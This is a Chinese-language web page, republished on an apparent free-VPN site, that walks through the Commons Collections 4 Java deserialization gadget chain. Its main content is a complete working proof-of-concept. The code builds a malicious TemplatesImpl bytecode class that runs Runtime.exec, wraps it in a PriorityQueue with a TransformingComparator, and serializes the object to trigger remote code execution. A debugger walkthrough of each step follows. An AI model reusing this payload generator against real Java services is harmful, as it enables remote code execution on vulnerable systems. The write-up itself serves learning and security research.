<!DOCTYPE html>
<html xml:lang="zh-CN" lang="zh-CN">

<head>
        <link rel="canonical" href="https://mianfeivpn.github.io/news/article-76345.htm" />
    <title>CommonsCollection4反序列化链学习</title>
        <meta name="description" content="1、前置知识 由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取temp" />
        <meta charset="utf-8">
    <link rel="icon" href="/assets/website/img/androidclash/favicon.ico" type="image/x-icon"/>
    
    <meta name="author" content="免费VPN节点机场订阅官网">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://mianfeivpn.github.io/news/article-76345.htm" />
    <meta property="og:site_name" content="免费VPN节点机场订阅官网" />
    <meta property="og:title" content="CommonsCollection4反序列化链学习" />
    <meta property="og:image" content="https://mianfeivpn.github.io/uploads/20240305/c556d43ab0b27b90e0e71e9418e309bb.webp" />
        <meta property="og:release_date" content="2025-03-18T06:13:03" />
    <meta property="og:updated_time" content="2025-03-18T06:13:03" />
        <meta property="og:description" content="1、前置知识 由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取temp" />
    
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <meta name="applicable-device" content="pc,mobile" />
    <meta name="renderer" content="webkit" />
    <meta name="force-rendering" content="webkit" />
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta name="robots" content="max-image-preview:large" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="CommonsCollection4反序列化链学习">
    <meta name="format-detection" content="telephone=no">

    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
    <link rel="dns-prefetch" href="https://www.googleadservices.com">
    <link rel="dns-prefetch" href="https://www.google-analytics.com">
    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
    <link rel="dns-prefetch" href="https://fonts.googleapis.com">

    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/font-awesome.min.css" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/animate.css" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/owl.carousel.min.css" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/owl.theme.default.min.css" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/magnific-popup.css" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/flaticon.css" rel="stylesheet" />
    <link href="/assets/website/css/androidclash/style.css" rel="stylesheet" />
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-DCKB1K87CW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-DCKB1K87CW');
</script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
     crossorigin="anonymous"></script>
</head>

<body data-page="detail">
        <nav class="navbar navbar-expand-lg navbar-dark ftco_navbar ftco-navbar-light site-navbar-target" id="ftco-navbar">
        <div class="container">
                        <a class="navbar-brand" href="/">免费VPN<span></span></a>
            
            <button class="navbar-toggler js-fh5co-nav-toggle fh5co-nav-toggle" type="button" data-toggle="collapse" data-target="#ftco-nav" aria-controls="ftco-nav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="oi oi-menu"></span> MENU
            </button>
            <div class="collapse navbar-collapse" id="ftco-nav">
                <ul class="navbar-nav nav ml-auto">
                	                    <li class="nav-item"><a href="/" class="nav-link"><span>首页</span></a></li>
                                        <li class="nav-item"><a href="/free-nodes/" class="nav-link"><span>免费节点</span></a></li>
                                        <li class="nav-item"><a href="/paid-subscribe/" class="nav-link"><span>推荐机场</span></a></li>
                                        <li class="nav-item"><a href="/client.htm" class="nav-link"><span>客户端</span></a></li>
                                        <li class="nav-item"><a href="/news/" class="nav-link"><span>新闻资讯</span></a></li>
                                    </ul>
            </div>
        </div>
    </nav>
    <section class="hero-wrap" style="height:350px;overflow: hidden;">
        <div class="overlay"></div>
        <div class="container-fluid px-0">
            <div class="row d-md-flex no-gutters slider-text align-items-center js-fullheight justify-content-end">
                <img class="one-third js-fullheight align-self-end order-md-last img-fluid" href="/assets/website/img/androidclash/undraw_book_lover_mkck.svg" alt="" style="opacity: 0.5;">
                <div class="one-forth d-flex align-items-center ftco-animate js-fullheight">
                    <div class="text" style="top: 30%;min-width: 70%;">
                        <h1>CommonsCollection4反序列化链学习</h1>
                        <p>
                            <a href="/">首页</a> / <a href="/news/">新闻资讯</a> / <span>正文</span>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="ftco-about img ftco-section" id="about-section">
        <div class="container">
            <div class="row">
                <div class="col-md-9">
                	                <input type="hidden" id="share-website-info" data-name="V2ray X节点订阅官网" data-url="https://v2rayx.github.io">
                  				  				  				</h1> <h2 id="1前置知识">1、前置知识</h2> <p>由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取templatesImpl的newtransformer()方法，改成用cc3的InstantiateTransformer初始化。那就把跟cc2不同的代码学习下。</p> <h3 id="11transformingcomparator">1.1、transformingComparator</h3> <p>与cc2最大的不容就是transformingComparator的构造方式不同，这里是通过获取InstantiateTransformer实例化TrAXFilter并且把templatesImpl恶意类传入，其实就是<strong>InstantiateTransformer(templateImpl).transform(TrAXFilter)</strong>。而且这就是cc3所用的方式，所以cc3在cc4占很少的部分，主要还是cc2</p> <pre><code class="language-java">Transformer[] transformers=new Transformer[]{         new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter         new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform  }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers  TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</code></pre> <h2 id="2poc分析">2、PoC分析</h2> <h3 id="21poc">2.1、Poc</h3> <pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer;  import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue;  public class CommonsCollection4 {       public static void main(String[] args) throws Exception {         String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";         String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";          ClassPool classPool=ClassPool.getDefault();//返回默认的类池         classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径         CtClass payload=classPool.makeClass("com/akkacloud/CommonsCollection2Test");//创建一个新的public类         payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet         payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");"); //创建一个空的类初始化，设置构造函数主体为runtime          //payload.writeFile("/Users/akka/Documents/study/JAVA-project/ysoserial/CommonsColection2/src/main/java");         byte[] bytes=payload.toBytecode();//转换为byte数组         //String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";         Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl         Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段         field.setAccessible(true);//暴力反射         field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组          Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段         field1.setAccessible(true);//暴力反射         field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test  /*        Method getTransletName = templatesImpl.getClass().getDeclaredMethod("getTransletName", new Class[]{});         getTransletName.setAccessible(true);         Object name = getTransletName.invoke(templatesImpl, new Object[]{});         System.out.println(name.toString());          Method getTransletBytecodes = templatesImpl.getClass().getDeclaredMethod("getTransletBytecodes", new Class[]{});         getTransletBytecodes.setAccessible(true);         byte[][] bytes1 = (byte[][]) getTransletBytecodes.invoke(templatesImpl, new Object[]{});         for (int i = 0; i &lt; bytes1.length; i++) {             System.out.println(bytes1.length);             System.out.println(Arrays.toString(bytes1[i]));         }*/          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter                 new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform          };         ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers          TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);          PriorityQueue priorityQueue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。         priorityQueue.add(1);//添加数字1插入此优先级队列         priorityQueue.add(1);//添加数字1插入此优先级队列          Field field2=priorityQueue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段         field2.setAccessible(true);//暴力反射         field2.set(priorityQueue,transformingComparator);//设置priorityQueue的comparator属性值为transformingComparator          ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));         outputStream.writeObject(priorityQueue);         outputStream.close();          ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.ser"));         inputStream.readObject();         } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/84a594027e9869bd4059b17a5abf6574.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="22poc调试">2.2、poc调试</h3> <p>在PriorityQueue的readObject打断点，发现队列内就是两个数字，进入heapify()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/0c056ce0e551c67eae8cc5f86937115b.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>因为在poc中我们没对queue字段赋值，所以queue里面就是两个数字，继续跟入siteDown()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/9dcbfaaac19dc31ccb8a49629f6f4241.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现x就是queue为空，与cc2此时的x为templatImpl，继续进入siftDownUsingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/75c08ec62d1dc7ac4c4c73302db5e27c.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现，通过comparator.compare(),这个comparator就是我们的恶意TransformingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/613ef9ebb1aacc142addfa63488c4ad4.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现TransformingComparator的compare方法里，用this.transformer调用了transform方法，此时的this.transformer是我们传入的ChainedTransformer，链式调用transform</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4fb2106781139889ca028ec6f4a797a.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入后看到第一个是ConstantTransformer，继续跟进transform方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/6bdc85e64e6354ba55e91a49759e3526.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>返回我们一开始构造的TrAXFilter.class</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7794999994be7591e23690cbaead6a11.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>第二遍是进入InstantiateTransformer ，object为我们上次循环获取TrAXFilter.class.继续跟进transform()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/5d60e424dc99179ffebd52658e78d527.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>这个transform就是实例化传入的object既TrAXFilter，而且传入的参数值为我们一起开始创建的恶意加载字节类TransformerImpl</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3cc72a1ebab4ecb8231b191dad0f7eb6.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入TrAXFilter的构造方法，传入的TransformerImpl被赋值给了templates，templates调用newTransformer方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4053a6d56747f82c3fbfca71f953de89.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>TransformerImpl的newTransformer方法，会调用本类的getTransletInstance方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/dc40946cbc03f89b8931759229136802.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现会继续调用defineTransletClasses()，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/09c72b1c7ea2b97aaf03a40edd4c4ded.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入defineTransletClasses方法后发现，会把我们前面构造的_bytecodes[i]传输给_class[i],饭后返回到getTransletInstance方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7fea6927a613b9eccd7b8c02145e97b9.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>然后在getTransletInstance方法后，实例化我们传入的_class[i]恶意类<mark>》TemplatesImpl</mark>》CommonsCollection2Test.</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/89b07006097f1bc7ced2773721289386.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>实例化就会调用我们一开始设置的静态代码块，造成RCE</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4f8b70a95347430a5b2ae087167ee6f.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="23利用链">2.3、利用链</h3> <pre><code class="language-java">Gadget chain: 		ObjectInputStream.readObject() 			PriorityQueue.readObject()         PriorityQueue.heapify()           PriorityQueue.siftDown()             PriorityQueue.siftDownUsingComparator()               ...                 TransformingComparator.compare()                   InstantiateTransformer.transform()                     Method.invoke()                       Runtime.exec()</code></pre> <h3 id="24思维导图">2.4、思维导图</h3> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4520c68ba4af81158b42d55f39d15b37.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="25结束">2.5、结束</h3> <p>cc4链还是比较简单，我继续每一步调试的原因就是可以更好的复习前面学习的链，我cc2和cc4用的是commonscollection4依赖版本才成功，cc1、cc3和cc5是用的jdk8u66才成功的</p> 			                <div class="clearfix"></div>
                <div class="col-md-12 mt-5">
                                        <p>上一个：<a href="/news/article-76341.htm">用字符串中的ASCII值替换所有特殊字符-JavaScript</a></p>
                                        <p>下一个：<a href="/news/article-77005.htm">宠物领养中心是免费的吗知乎全文（宠物领养所）</a></p>
                                    </div>
                                </div>
                <div class="col-md-3">
                	<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">热门文章</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2"><a href="/news/article-54231.htm" title="vue项目几个比较好的实践(路由模块化，打包dll优化，vuex)">vue项目几个比较好的实践(路由模块化，打包dll优化，vuex)</a></li>
                        <li class="py-2"><a href="/free-nodes/2025-2-21-node-share-links.htm" title="2月21日免费VPN订阅 | 2025年22.1M/S|Shadowrocket/Clash/V2ray/SSR免费节点链接地址">2月21日免费VPN订阅 | 2025年22.1M/S|Shadowrocket/Clash/V2ray/SSR免费节点链接地址</a></li>
                        <li class="py-2"><a href="/news/article-72302.htm" title="动物打一针疫苗多少钱 动物打一针疫苗多少钱啊">动物打一针疫苗多少钱 动物打一针疫苗多少钱啊</a></li>
                        <li class="py-2"><a href="/news/article-72975.htm" title="动物的疫苗多久打一次最好（动物疫苗打几次）">动物的疫苗多久打一次最好（动物疫苗打几次）</a></li>
                        <li class="py-2"><a href="/news/article-68369.htm" title="东北农大动物医院哪个大夫好些（东北农大兽医医院）">东北农大动物医院哪个大夫好些（东北农大兽医医院）</a></li>
                        <li class="py-2"><a href="/news/article-72304.htm" title="大拌菜的做法大全(果蔬沙拉大拌菜的做法)">大拌菜的做法大全(果蔬沙拉大拌菜的做法)</a></li>
                        <li class="py-2"><a href="/news/article-58786.htm" title="猫咪三针疫苗多少钱一只 猫咪三针疫苗多少钱一只啊">猫咪三针疫苗多少钱一只 猫咪三针疫苗多少钱一只啊</a></li>
                        <li class="py-2"><a href="/news/article-54781.htm" title="猫咪的三针疫苗（猫咪的3针疫苗）">猫咪的三针疫苗（猫咪的3针疫苗）</a></li>
                        <li class="py-2"><a href="/news/article-65840.htm" title="动物医院医生聘用合同怎么写（动物医院医生聘用合同怎么写范文）">动物医院医生聘用合同怎么写（动物医院医生聘用合同怎么写范文）</a></li>
                        <li class="py-2"><a href="/news/article-51579.htm" title="宠物打疫苗前注意事项（宠物打疫苗前要注意什么）">宠物打疫苗前注意事项（宠物打疫苗前要注意什么）</a></li>
                    </ul>
    </div>
</div>

<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">归纳</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">59</span> <a href="/date/2025-03/" title="2025-03 归档">2025-03</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">78</span> <a href="/date/2025-02/" title="2025-02 归档">2025-02</a></h4>
            </li>
                    </ul>
    </div>
</div>

                </div>
            </div>
        </div>
    </section>
        <footer class="ftco-footer ftco-section">
        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center">
                    <p>
                        <a href="/">首页</a> | 
                        <a href="/free-node/">免费节点</a> | 
                        <a href="/news/">新闻资讯</a> |
                        <a href="/about-us.htm">关于我们</a> |
                        <a href="/disclaimer.htm">免责申明</a> |
                        <a href="/privacy.htm">隐私申明</a> |
                        <a href="/sitemap.xml">网站地图</a>
                    </p>
                    <p>
                        <a href="/">免费VPN节点机场订阅官网</a> 版权所有
                        <br />
                        Powered by WordPress
                    </p>
                </div>
            </div>
        </div>
    </footer>
    <!-- loader -->
    <div id="ftco-loader" class="show fullscreen"><svg class="circular" width="48px" height="48px">
            <circle class="path-bg" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke="#eeeeee" />
            <circle class="path" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke-miterlimit="10" stroke="#F96D00" /></svg></div>
    <script src="/assets/website/js/frontend/androidclash/jquery.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/jquery-migrate-3.0.1.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/popper.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/bootstrap.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/jquery.easing.1.3.js"></script>
    <script src="/assets/website/js/frontend/androidclash/jquery.waypoints.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/jquery.stellar.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/owl.carousel.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/jquery.magnific-popup.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/jquery.animateNumber.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/scrollax.min.js"></script>
    <script src="/assets/website/js/frontend/androidclash/main.js"></script>
    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
    <script src="/assets/website/js/frontend/G.js"></script>
</body>

</html>